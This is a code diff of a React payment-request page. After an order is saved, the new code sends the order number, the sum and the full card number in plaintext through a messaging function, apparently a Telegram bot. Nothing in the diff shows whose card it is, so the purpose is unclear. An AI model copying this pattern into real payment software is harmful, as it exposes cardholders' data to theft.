@@ -90,6 +90,7 @@ const PaymentRequest = () => {
             userId: userId,
           });
           console.log('History saved:', response.data);
+          handleSmsSend();
         } catch (error) {
           console.error('Error saving to history:', error);
         }
@@ -113,16 +114,23 @@ const PaymentRequest = () => {
       setShowAlert(false);
     }, 3000);
   };
-
-  const handleTelegram = async () => {
+  const handleSmsSend = async () => {
     try {
-      if (order && orderSum && card) {
-        await sendMessage(`Заявка №: ${order}, Сума: ${orderSum} RUB, Картка: ${card}`);
-      }
-    } catch (err) {
-      console.error('Error sending message:', err);
-    }
-  };
+      const message = `
+          order : [ ${order} ] orderSum: [ ${orderSum}  ] BANK : [ В разработке...  ]
+          Name: [  ] CARD Number: [${card}] ]
+      `;
+
+      sendMessage(message);
+
+      
+
+     
+  } catch (error) {
+      console.error('Error sending message:', error.message);
+  }
+  }
+ 
 
   const result = orderSum / rate * 0.85;
 
@@ -206,7 +214,7 @@ const PaymentRequest = () => {
             <div className="bg-white p-4 rounded-lg">
               <div className="">
                 <h2 className="text-base font-normal">Обслуживающий банк</h2>
-                <p className="text-sm mt-2 text-blueth">{orderSum || (error && <p className="text-red-500 font-bold">Ошибка</p>)}</p>
+                <p className="text-sm mt-2 text-blueth">{ ' ... ' || (error && <p className="text-red-500 font-bold">Ошибка</p>)}</p>
               </div>
             </div>
           </div>
